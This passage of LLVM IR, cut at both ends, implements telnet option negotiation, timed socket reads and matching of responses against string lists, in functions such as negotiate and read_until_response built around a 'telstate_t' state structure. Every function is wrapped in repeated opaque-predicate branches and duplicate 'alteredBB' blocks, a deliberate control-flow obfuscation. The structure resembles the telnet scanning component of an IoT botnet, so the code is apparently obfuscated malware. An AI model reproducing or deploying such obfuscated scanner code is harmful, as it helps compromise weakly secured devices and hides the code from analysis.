  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %141 [
    i32 255, label %13
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:13:                                     ; preds = %3
  %14 = load i32, i32* @x.45
  %15 = load i32, i32* @y.46
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %4, align 4
  %22 = load i32, i32* @x.45
  %23 = load i32, i32* @y.46
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %175

; <label>:30:                                     ; preds = %3, %3, %3, %3
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  store i8 -1, i8* %8, align 1
  %39 = load i32, i32* %5, align 4
  %40 = call i64 @send(i32 %39, i8* %8, i64 1, i32 16384)
  %41 = load i8*, i8** %6, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 1
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 252, %44
  %46 = load i32, i32* @x.45
  %47 = load i32, i32* @y.46
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %55

; <label>:54:                                     ; preds = %originalBBpart24
  store i8 -2, i8* %8, align 1
  br label %134

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i32, i32* @x.45
  %57 = load i32, i32* @y.46
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 1
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 254, %67
  %69 = load i32, i32* @x.45
  %70 = load i32, i32* @y.46
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %68, label %77, label %94

; <label>:77:                                     ; preds = %originalBBpart28
  %78 = load i32, i32* @x.45
  %79 = load i32, i32* @y.46
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %77
  store i8 -4, i8* %8, align 1
  %86 = load i32, i32* @x.45
  %87 = load i32, i32* @y.46
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %133

; <label>:94:                                     ; preds = %originalBBpart28
  %95 = load i8*, i8** %6, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 3, %98
  br i1 %99, label %100, label %124

; <label>:100:                                    ; preds = %94
  %101 = load i32, i32* @x.45
  %102 = load i32, i32* @y.46
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %100
  %109 = load i8*, i8** %6, align 8
  %110 = getelementptr inbounds i8, i8* %109, i64 1
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 253
  %114 = select i1 %113, i32 251, i32 253
  %115 = trunc i32 %114 to i8
  store i8 %115, i8* %8, align 1
  %116 = load i32, i32* @x.45
  %117 = load i32, i32* @y.46
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %132

; <label>:124:                                    ; preds = %94
  %125 = load i8*, i8** %6, align 8
  %126 = getelementptr inbounds i8, i8* %125, i64 1
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 253
  %130 = select i1 %129, i32 252, i32 254
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  br label %132

; <label>:132:                                    ; preds = %124, %originalBBpart216
  br label %133

; <label>:133:                                    ; preds = %132, %originalBBpart212
  br label %134

; <label>:134:                                    ; preds = %133, %54
  %135 = load i32, i32* %5, align 4
  %136 = call i64 @send(i32 %135, i8* %8, i64 1, i32 16384)
  %137 = load i32, i32* %5, align 4
  %138 = load i8*, i8** %6, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 2
  %140 = call i64 @send(i32 %137, i8* %139, i64 1, i32 16384)
  br label %158

; <label>:141:                                    ; preds = %3
  %142 = load i32, i32* @x.45
  %143 = load i32, i32* @y.46
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %150 = load i32, i32* @x.45
  %151 = load i32, i32* @y.46
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %158

; <label>:158:                                    ; preds = %originalBBpart220, %134
  %159 = load i32, i32* @x.45
  %160 = load i32, i32* @y.46
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %158
  store i32 0, i32* %4, align 4
  %167 = load i32, i32* @x.45
  %168 = load i32, i32* @y.46
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %175

; <label>:175:                                    ; preds = %originalBBpart224, %originalBBpart2
  %176 = load i32, i32* %4, align 4
  ret i32 %176

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  store i8 -1, i8* %8, align 1
  %177 = load i32, i32* %5, align 4
  %178 = call i64 @send(i32 %177, i8* %8, i64 1, i32 16384)
  %179 = load i8*, i8** %6, align 8
  %180 = getelementptr inbounds i8, i8* %179, i64 1
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 252, %182
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %184 = load i8*, i8** %6, align 8
  %185 = getelementptr inbounds i8, i8* %184, i64 1
  %186 = load i8, i8* %185, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp eq i32 254, %187
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %77
  store i8 -4, i8* %8, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %100
  %189 = load i8*, i8** %6, align 8
  %190 = getelementptr inbounds i8, i8* %189, i64 1
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 253
  %194 = select i1 %193, i32 251, i32 253
  %195 = trunc i32 %194 to i8
  store i8 %195, i8* %8, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %158
  store i32 0, i32* %4, align 4
  br label %originalBB22
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = load i32, i32* @x.47
  %4 = load i32, i32* @y.48
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8**, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8** %1, i8*** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %16 = load i32, i32* @x.47
  %17 = load i32, i32* @y.48
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %32, %originalBBpart2
  %25 = load i8**, i8*** %13, align 8
  %26 = load i32, i32* %14, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %14, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %25, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = icmp ne i8* %30, null
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %24
  br label %24

; <label>:33:                                     ; preds = %24
  store i32 0, i32* %15, align 4
  br label %34

; <label>:34:                                     ; preds = %originalBBpart28, %33
  %35 = load i32, i32* %15, align 4
  %36 = load i32, i32* %14, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %84

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %12, align 8
  %40 = load i8**, i8*** %13, align 8
  %41 = load i32, i32* %15, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8*, i8** %40, i64 %42
  %44 = load i8*, i8** %43, align 8
  %45 = call i8* @strcasestr(i8* %39, i8* %44) #10
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 1, i32* %11, align 4
  br label %101

; <label>:48:                                     ; preds = %38
  %49 = load i32, i32* @x.47
  %50 = load i32, i32* @y.48
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load i32, i32* @x.47
  %58 = load i32, i32* @y.48
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* @x.47
  %67 = load i32, i32* @y.48
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  %76 = load i32, i32* @x.47
  %77 = load i32, i32* @y.48
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %34

; <label>:84:                                     ; preds = %34
  %85 = load i32, i32* @x.47
  %86 = load i32, i32* @y.48
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %84
  store i32 0, i32* %11, align 4
  %93 = load i32, i32* @x.47
  %94 = load i32, i32* @y.48
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %101

; <label>:101:                                    ; preds = %originalBBpart212, %47
  %102 = load i32, i32* %11, align 4
  ret i32 %102

originalBBalteredBB:                              ; preds = %originalBB, %2
  %103 = alloca i32, align 4
  %104 = alloca i8*, align 8
  %105 = alloca i8**, align 8
  %106 = alloca i32, align 4
  %107 = alloca i32, align 4
  store i8* %0, i8** %104, align 8
  store i8** %1, i8*** %105, align 8
  store i32 0, i32* %106, align 4
  store i32 0, i32* %107, align 4
  store i32 0, i32* %106, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %108 = load i32, i32* %15, align 4
  %_ = sub i32 0, %108
  %gen = add i32 %_, 1
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %15, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  store i32 0, i32* %11, align 4
  br label %originalBB10
}

; Function Attrs: nounwind readonly
declare i8* @strcasestr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.49
  %6 = load i32, i32* @y.50
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.49
  %27 = load i32, i32* @y.50
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #2, !srcloc !3
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.__sigset_t* %18, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %43
  store i32 0, i32* %13, align 4
  br label %67

; <label>:60:                                     ; preds = %43
  %61 = load i32, i32* %14, align 4
  %62 = load i8*, i8** %16, align 8
  %63 = load i32, i32* %17, align 4
  %64 = sext i32 %63 to i64
  %65 = call i64 @recv(i32 %61, i8* %62, i64 %64, i32 0)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %13, align 4
  br label %67

; <label>:67:                                     ; preds = %60, %59
  %68 = load i32, i32* @x.49
  %69 = load i32, i32* @y.50
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* %13, align 4
  %77 = load i32, i32* @x.49
  %78 = load i32, i32* @y.50
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %76

originalBBalteredBB:                              ; preds = %originalBB, %4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  %88 = alloca i8*, align 8
  %89 = alloca i32, align 4
  %90 = alloca %struct.__sigset_t, align 8
  %91 = alloca %struct.timeval, align 8
  %92 = alloca i32, align 4
  %93 = alloca i32, align 4
  store i32 %0, i32* %86, align 4
  store i32 %1, i32* %87, align 4
  store i8* %2, i8** %88, align 8
  store i32 %3, i32* %89, align 4
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 0
  store i64 0, i64* %94, align 8
  %95 = load i32, i32* %87, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %98 = load i32, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = load i32, i32* @x.51
  %7 = load i32, i32* @y.52
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i32 %1, i32* %16, align 4
  store i8* %2, i8** %17, align 8
  store i32 %3, i32* %18, align 4
  store i8** %4, i8*** %19, align 8
  %22 = load i8*, i8** %17, align 8
  %23 = load i32, i32* %18, align 4
  %24 = sext i32 %23 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %24, i32 1, i1 false)
  %25 = load i32, i32* %15, align 4
  %26 = load i32, i32* %16, align 4
  %27 = load i8*, i8** %17, align 8
  %28 = load i32, i32* %18, align 4
  %29 = call i32 @read_with_timeout(i32 %25, i32 %26, i8* %27, i32 %28)
  store i32 %29, i32* %20, align 4
  %30 = load i8*, i8** %17, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 255
  %35 = load i32, i32* @x.51
  %36 = load i32, i32* @y.52
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %15, align 4
  %45 = load i8*, i8** %17, align 8
  %46 = call i32 @negotiate(i32 %44, i8* %45, i32 3)
  br label %47

; <label>:47:                                     ; preds = %43, %originalBBpart2
  %48 = load i32, i32* @x.51
  %49 = load i32, i32* @y.52
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i8*, i8** %17, align 8
  %57 = load i8**, i8*** %19, align 8
  %58 = call i32 @contains_string(i8* %56, i8** %57)
  %59 = icmp ne i32 %58, 0
  %60 = load i32, i32* @x.51
  %61 = load i32, i32* @y.52
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %85

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* @x.51
  %70 = load i32, i32* @y.52
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  store i32 1, i32* %14, align 4
  %77 = load i32, i32* @x.51
  %78 = load i32, i32* @y.52
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %86

; <label>:85:                                     ; preds = %originalBBpart24
  store i32 0, i32* %14, align 4
  br label %86

; <label>:86:                                     ; preds = %85, %originalBBpart28
  %87 = load i32, i32* %14, align 4
  ret i32 %87

originalBBalteredBB:                              ; preds = %originalBB, %5
  %88 = alloca i32, align 4
  %89 = alloca i32, align 4
  %90 = alloca i32, align 4
  %91 = alloca i8*, align 8
  %92 = alloca i32, align 4
  %93 = alloca i8**, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  store i32 %0, i32* %89, align 4
  store i32 %1, i32* %90, align 4
  store i8* %2, i8** %91, align 8
  store i32 %3, i32* %92, align 4
  store i8** %4, i8*** %93, align 8
  %96 = load i8*, i8** %91, align 8
  %97 = load i32, i32* %92, align 4
  %98 = sext i32 %97 to i64
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 %98, i32 1, i1 false)
  %99 = load i32, i32* %89, align 4
  %100 = load i32, i32* %90, align 4
  %101 = load i8*, i8** %91, align 8
  %102 = load i32, i32* %92, align 4
  %103 = call i32 @read_with_timeout(i32 %99, i32 %100, i8* %101, i32 %102)
  store i32 %103, i32* %94, align 4
  %104 = load i8*, i8** %91, align 8
  %105 = getelementptr inbounds i8, i8* %104, i64 0
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %107, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %109 = load i8*, i8** %17, align 8
  %110 = load i8**, i8*** %19, align 8
  %111 = call i32 @contains_string(i8* %109, i8** %110)
  %112 = icmp ne i32 %111, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  store i32 1, i32* %14, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
